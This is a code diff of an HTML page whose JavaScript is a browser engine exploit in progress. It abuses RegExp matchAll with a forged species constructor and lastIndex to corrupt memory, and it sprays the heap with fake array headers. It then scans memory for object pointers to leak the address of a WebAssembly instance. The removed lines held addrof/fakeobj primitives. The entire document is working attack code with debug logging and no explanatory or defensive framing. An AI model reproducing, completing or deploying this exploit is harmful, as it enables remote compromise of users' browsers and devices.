@@ -1,5 +1,4 @@
-<!doctype html>
-<html><head><meta charset="utf-8"><title>P34</title></head>
+<!doctype html><html><head><meta charset="utf-8"><title>P34</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -12,16 +11,12 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
-const PINS=[0x1080011];
-const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
 const marker={mmm:1};
-const marker2={zzz:2};
-const objB=new Array(0x8000);
-for(var i=0;i<objB.length;i++)objB[i]=marker;
+const objB=new Array(0x10000);
+for(let i=0;i<6;i++)objB[i]=marker;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
-objB[4]=wasmI;
-const victim=[1.22,1.33,1.44];
+objB[4]=wasmI; objB[5]=marker; // Ensure: ..mk,mk,mk,mk,wasmI,mk,mk..
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY);
@@ -32,8 +27,7 @@ RegExp.prototype[Symbol.matchAll].call(fk,"").next();
 log("TRIG: "+re.lastIndex);
 trash(230);trash(230);
 for(let r=0;r<3;r++){
-  const pin=PINS[r%2];
-  const c1=w2f(pin,MAXS);
+  const c1=w2f(0x1080011,MAXS);
   for(let i=0;i<12;i++){
     const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
     for(let j=1;j<a.length;j+=2)a[j]=c1;
@@ -45,54 +39,58 @@ const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
-  const d=[];
-  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
-  log("H0: "+d.join(","));
-  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
-  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
-  let OB=-1;
-  for(let k=0x8000;k<0x70000;k++){
+  // Step 1: find marker_ptr from any (mk,mk) pair in pages 1-7
+  let MK=0n;let firstPairK=-1;
+  for(let k=0x8000;k<0x30000;k++){
     try{
       const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
-      if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
-        objB[5]=marker;
-        if((f2i(m[k])>>32n)===lo){OB=k;break;}
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100n&&lo<0x10000000n){
+        MK=lo;firstPairK=k;break;
       }
-    }catch(e){log("STOP:"+k.toString(16));break;}
+    }catch(e){break;}
   }
-  if(OB>=0){
-    log("OB:"+OB.toString(16));
-    objB[4]=wasmI;
-    log("WASM:"+(f2i(m[OB+2])&0xffffffffn).toString(16));
-    objB[4]=marker;
-    // FAKEOBJ roundtrip ONLY (no fake array, no ES)
-    objB[4]=wasmI;
-    const raw=f2i(m[OB+2]);
-    m[OB+2]=i2f(raw);
-    const fo=objB[4];
-    const foOk=(!!fo&&!!fo.exports&&fo.exports.f()===42);
-    objB[4]=marker;
-    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
-    // fake array header in objB slots 16-19, deref slot24, read wasmI's first qword
-    m[OB+8]=i2f((BigInt(EMPTY)<<32n)|BigInt(DMAP));
-    m[OB+9]=i2f((6n<<32n)|((wasmAddr-8n+1n)&0xffffffffn));
-    const fakeAddr=BigInt(0x1080018+(OB+8)*8+1);
-    // === live-connection test: does objB write reflect in m? ===
-    const before=f2i(m[OB+2]).toString(16);
-    objB[4]=marker2;
-    const after4=f2i(m[OB+2]).toString(16);
-    objB[9]=marker2;   // far slot (m[OB+4] hi)
-    const after9=f2i(m[OB+4]).toString(16);
-    objB[4]=marker;objB[9]=marker;
-    const restored=f2i(m[OB+2]).toString(16);
-    log("LIVE b:"+before+" a4:"+after4+" a9:"+after9+" r:"+restored);
-    log("SAME4:"+(before===after4));
-    log("FO:"+foOk);
-    log("CHAIN_DONE");
-  }else{log("MARKER_MISS");}
+  if(MK>0n){
+    log("MK:"+MK.toString(16)+"@"+firstPairK.toString(16));
+    // Step 2: find wasmI — look for QWORDs where ONE half = MK and other ≠ MK
+    // Check lo32=MK,hi32=X and hi32=MK,lo32=X patterns
+    const hits=[];
+    for(let k=firstPairK-2;k<firstPairK+0x4000&&k<0x50000;k++){
+      if(k<0)continue;
+      try{
+        const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+        // Pattern: one half is MK, other is different odd pointer
+        if(lo===MK&&hi!==MK&&(hi&1n)===1n&&hi>0x100n){
+          hits.push({k,wasmInHi:true,ptr:hi});
+        }
+        if(hi===MK&&lo!==MK&&(lo&1n)===1n&&lo>0x100n){
+          hits.push({k,wasmInHi:false,ptr:lo});
+        }
+        if(hits.length>=6)break;
+      }catch(e){break;}
+    }
+    log("H:"+hits.length);
+    for(const h of hits.slice(0,4)){
+      log((h.wasmInHi?"HI":"LO")+"@"+h.k.toString(16)+":"+h.ptr.toString(16));
+    }
+    // The first non-MK odd pointer near objB is wasmI
+    if(hits.length>0){
+      const wasmPtr=hits[0].ptr;
+      log("WASM:"+wasmPtr.toString(16));
+      // Verify by checking if it's a WasmInstance: read its fields
+      const wasmRaw=Number(wasmPtr&0xfffffffen);
+      const idx=Math.floor((wasmRaw-0x1080018)/8);
+      if(idx>0&&idx<0x7FDFFFFE){
+        try{
+          const f0=f2i(m[idx]);
+          const f1=f2i(m[idx+1]);
+          log("WF0:"+f0.toString(16));
+          log("WF1:"+f1.toString(16));
+        }catch(e){log("WF_E:"+e.message);}
+      }
+    }
+  }else{log("NO_MK");}
   log("W: "+wasmI.exports.f());
-}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
-else{log("OBJ:"+typeof m);}
+}else{log("NA");}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
